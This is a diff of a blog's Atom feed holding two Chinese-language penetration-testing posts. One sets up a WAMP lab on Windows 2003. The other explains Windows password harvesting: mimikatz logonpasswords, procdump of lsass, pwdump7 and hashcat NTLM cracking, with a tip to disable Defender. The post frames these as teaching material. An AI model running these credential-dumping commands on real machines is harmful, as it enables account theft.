     <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><a href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！" class="headerlink" title="&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！"></a>&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到<a href="https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA" target="_blank" rel="external">我的云盘</a>  密码:8r5k，节约大家搜集软件的时间！</h4><a id="more"></a>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
 <h2 id="0x01-搭建Apache2-2"><a href="#0x01-搭建Apache2-2" class="headerlink" title="0x01. 搭建Apache2_2"></a>0x01. 搭建Apache2_2</h2><blockquote>
 <ol>
 <li>运行apache2.2.10-win32-x86-no_ssl.msi</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>一路下一步，到了域名那里随便填一个域名就可以了，接着下一步选择Custom 模式自定义安装</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>然后选择Apache Http Server 2.2.10，再点击change改变安装目录为C:\apm\apache2</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>再一路默认就安装好了，在右下角有apache的图标，到目前为止apache就安装好了</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
 <h2 id="0x02-安装PHP5"><a href="#0x02-安装PHP5" class="headerlink" title="0x02. 安装PHP5"></a>0x02. 安装PHP5</h2><blockquote>
 <ol>
 <li>将PHP5 文件夹拖到C:\apm\ 文件夹下</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>将php5 文件下面的php.ini-development 文件修改为php.ini</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>（1）打开php.ini 将 ; extension_dir = “./“ 修改为extension_dir = “c:\apm\php5\ext”  ; </li>
 </ol>
 <p>（2）去掉 extension=php_gd2.dll，extension=php_mbstring.dll，extension=php_mysql.dll, extension=php_mysqli.dll 前面的 ; </p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>（1）打开c:\apm\apache2\conf\httpd.conf 配置文件，找到DirectoryIndex index.html，修改为DirectoryIndex index.html index.php login.php</li>
@@ -182,29 +182,29 @@
 <p>AddType application/x-httpd-php .php</p>
 <p>PHPIniDir “c:/apm/php5/php.ini”</p>
 <p>“””</p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>添加系统环境变量，将 ;c:\apm\php5;c:\apm\php5\ext 加到环境变量后面</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
 <blockquote>
 <ol>
 <li>重启计算机就能看到已经将PHP整合到Apache中了，此时已经可以解析php文件</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
 <h2 id="0x03-安装phpMyAdmin"><a href="#0x03-安装phpMyAdmin" class="headerlink" title="0x03. 安装phpMyAdmin"></a>0x03. 安装phpMyAdmin</h2><blockquote>
 <p>将phpMyAdmin 文件夹放到c:\apm\apache2\htdocs 文件夹下面，在目录中找到一个名为config.sample.inc.php的文件，将此文件复制一份并命名为config.inc.php，这个文件就是phpMyAdmin的配置文件了，重启apache就可以了</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
 <h2 id="0x04-安装Mysql"><a href="#0x04-安装Mysql" class="headerlink" title="0x04. 安装Mysql"></a>0x04. 安装Mysql</h2><blockquote>
 <ol>
 <li>打开mysql-5.5.60-win32.msi ，一路下一步，大致步骤和Apache相似，在“Developer Components（开发者部分）”上左键单击，选择“This feature, and all subfeatures, will be installed on local hard drive.”</li>
 </ol>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
 <h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"><a href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。" class="headerlink" title="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"></a>其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。</h4>]]></content>
     
     <summary type="html">
@@ -221,78 +221,78 @@
     <link href="http://TimeS0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/"/>
     <id>http://TimeS0ng.github.io/2018/04/20/Windows密码抓取总结/</id>
     <published>2018-04-20T15:39:10.000Z</published>
-    <updated>2018-04-20T15:39:35.550Z</updated>
+    <updated>2018-12-18T15:37:48.133Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"><a href="#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。" class="headerlink" title="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"></a>渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</h4><a id="more"></a>
 <blockquote>
 <p> [本教程具有一定攻击性，仅限于教学使用，不得用于其他用途]</p>
 </blockquote>
-<h2 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h2><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><a href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）" class="headerlink" title="&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）"></a>&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）</h4><h4 id="emsp-emsp-mimikatz-trunk-emsp-download-here"><a href="#emsp-emsp-mimikatz-trunk-emsp-download-here" class="headerlink" title="&emsp;&emsp;mimikatz_trunk &emsp;// download here"></a>&emsp;&emsp;mimikatz_trunk &emsp;// <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><a href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行" class="headerlink" title="1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)"></a>1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418203056_WR5Aim_Screenshot.jpeg" alt=""></p>
+<h2 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h2><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><a href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）" class="headerlink" title="&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）"></a>&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）</h4><h4 id="emsp-emsp-mimikatz-trunk-emsp-download-here"><a href="#emsp-emsp-mimikatz-trunk-emsp-download-here" class="headerlink" title="&emsp;&emsp;mimikatz_trunk &emsp;// download here"></a>&emsp;&emsp;mimikatz_trunk &emsp;// <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><a href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行" class="headerlink" title="1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)"></a>1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418203056_WR5Aim_Screenshot.jpeg" alt=""></p>
 <h4 id="2-紧接着再进入mimikatz，运行命令"><a href="#2-紧接着再进入mimikatz，运行命令" class="headerlink" title="2. 紧接着再进入mimikatz，运行命令"></a>2. 紧接着再进入mimikatz，运行命令</h4><blockquote>
 <p>privilege::debug</p>
 <p>sekurlsa::logonpasswords</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418205101_7Jvn4f_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418205101_7Jvn4f_Screenshot.jpeg" alt=""></p>
 <blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204329_wHS2Qi_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418204329_wHS2Qi_Screenshot.jpeg" alt=""></p>
 </blockquote>
-<h4 id="3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><a href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文" class="headerlink" title="3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"></a>3. 此时我们就能得到username，password的密文，给大家推荐个<a href="https://www.somd5.com" target="_blank" rel="external">网站-here</a>，这里可以很容易的解密大多数密文</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204918_4DUANd_Screenshot.jpeg" alt=""></p>
+<h4 id="3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><a href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文" class="headerlink" title="3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"></a>3. 此时我们就能得到username，password的密文，给大家推荐个<a href="https://www.somd5.com" target="_blank" rel="external">网站-here</a>，这里可以很容易的解密大多数密文</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418204918_4DUANd_Screenshot.jpeg" alt=""></p>
 <h2 id="0x02-利用procdump-amp-mimikatz获取密码"><a href="#0x02-利用procdump-amp-mimikatz获取密码" class="headerlink" title="0x02. 利用procdump &amp; mimikatz获取密码"></a>0x02. 利用procdump &amp; mimikatz获取密码</h2><h4 id="实验环境：-1"><a href="#实验环境：-1" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-1-windows-7"><a href="#emsp-emsp-1-windows-7" class="headerlink" title="&emsp;&emsp;1. windows 7"></a>&emsp;&emsp;1. windows 7</h4><h4 id="emsp-emsp-2-procdump-emsp-download-here"><a href="#emsp-emsp-2-procdump-emsp-download-here" class="headerlink" title="&emsp;&emsp;2. procdump &emsp;// download here"></a>&emsp;&emsp;2. procdump &emsp;// <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-3-mimikatz-trunk"><a href="#emsp-emsp-3-mimikatz-trunk" class="headerlink" title="&emsp;&emsp;3. mimikatz_trunk"></a>&emsp;&emsp;3. mimikatz_trunk</h4><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤:"></a>实验步骤:</h4><h4 id="1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）"><a href="#1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）" class="headerlink" title="1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）"></a>1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</h4><blockquote>
 <p>C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe  C:\Users\times0ng\Desktop\lsass.dmp</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212206_7LasW4_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418212206_7LasW4_Screenshot.jpeg" alt=""></p>
 <h4 id="2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）"><a href="#2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）" class="headerlink" title="2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）"></a>2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</h4><blockquote>
 <p>C:\Users\times0ng\Desktop\mimikatz_trunk\x64\mimikatz.exe</p>
 <p>sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</p>
 <p>sekurlsa::tspkg</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212557_gNzdRI_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418212557_gNzdRI_Screenshot.jpeg" alt=""></p>
 <h2 id="0x03-利用pwdump7获取密码"><a href="#0x03-利用pwdump7获取密码" class="headerlink" title="0x03. 利用pwdump7获取密码"></a>0x03. 利用<strong>pwdump7</strong>获取密码</h2><p>实验环境：</p>
-<h4 id="emsp-emsp-windows-7"><a href="#emsp-emsp-windows-7" class="headerlink" title="&emsp;&emsp;windows 7"></a>&emsp;&emsp;windows 7</h4><h4 id="emsp-emsp-pwdump7-emsp-download-here"><a href="#emsp-emsp-pwdump7-emsp-download-here" class="headerlink" title="&emsp;&emsp;pwdump7 &emsp;// download here"></a>&emsp;&emsp;<strong>pwdump7</strong> &emsp;// <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-直接用管理员运行cmd，再运行pwdump7-exe"><a href="#1-直接用管理员运行cmd，再运行pwdump7-exe" class="headerlink" title="1. 直接用管理员运行cmd，再运行pwdump7.exe"></a>1. 直接用管理员运行cmd，再运行pwdump7.exe</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419001635_R2mdci_Screenshot.jpeg" alt=""></p>
+<h4 id="emsp-emsp-windows-7"><a href="#emsp-emsp-windows-7" class="headerlink" title="&emsp;&emsp;windows 7"></a>&emsp;&emsp;windows 7</h4><h4 id="emsp-emsp-pwdump7-emsp-download-here"><a href="#emsp-emsp-pwdump7-emsp-download-here" class="headerlink" title="&emsp;&emsp;pwdump7 &emsp;// download here"></a>&emsp;&emsp;<strong>pwdump7</strong> &emsp;// <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-直接用管理员运行cmd，再运行pwdump7-exe"><a href="#1-直接用管理员运行cmd，再运行pwdump7-exe" class="headerlink" title="1. 直接用管理员运行cmd，再运行pwdump7.exe"></a>1. 直接用管理员运行cmd，再运行pwdump7.exe</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419001635_R2mdci_Screenshot.jpeg" alt=""></p>
 <h4 id="2-用hashcat直接跑NTLM密码"><a href="#2-用hashcat直接跑NTLM密码" class="headerlink" title="2. 用hashcat直接跑NTLM密码"></a>2. 用hashcat直接跑NTLM密码</h4><blockquote>
 <p>hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt –force</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419002119_puCgGq_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419002119_puCgGq_Screenshot.jpeg" alt=""></p>
 <h2 id="0x04-利用虚拟机文件获取密码"><a href="#0x04-利用虚拟机文件获取密码" class="headerlink" title="0x04. 利用虚拟机文件获取密码"></a>0x04. 利用虚拟机文件获取密码</h2><h4 id="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"><a href="#关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！" class="headerlink" title="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks pwdump 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"></a>关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="external"><strong>PowerMemory</strong></a>、<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external"><strong>quarks pwdump </strong></a>等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！</h4><h4 id="接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt"><a href="#接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt" class="headerlink" title="接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 .vmss 和 .vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze 、DumpIt"></a>接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 <em>.vmss 和 </em>.vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="external">Memoryze</a> 、<a href="http://qpdownload.com/dumpit/" target="_blank" rel="external">DumpIt</a></h4><h4 id="实验环境：-2"><a href="#实验环境：-2" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-7-挂起状态"><a href="#emsp-emsp-windows-7-挂起状态" class="headerlink" title="&emsp;&emsp;windows 7 挂起状态"></a>&emsp;&emsp;windows 7 挂起状态</h4><h4 id="emsp-emsp-Vmss2core-emsp-download-here"><a href="#emsp-emsp-Vmss2core-emsp-download-here" class="headerlink" title="&emsp;&emsp;Vmss2core &emsp;// download here"></a>&emsp;&emsp;Vmss2core &emsp;// <a href="https://labs.vmware.com/flings/vmss2core#summary" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-Volatility-emsp-download-here"><a href="#emsp-emsp-Volatility-emsp-download-here" class="headerlink" title="&emsp;&emsp;Volatility  &emsp; // download here"></a>&emsp;&emsp;Volatility  &emsp; // <a href="http://www.volatilityfoundation.org/26" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件"><a href="#1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件" class="headerlink" title="1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件"></a>1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件</h4><blockquote>
 <p>./vmss2core-mac64 -W /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmss /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmem </p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111752_6vqNIx_Screenshot.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419111752_6vqNIx_Screenshot.jpeg" alt=""></p>
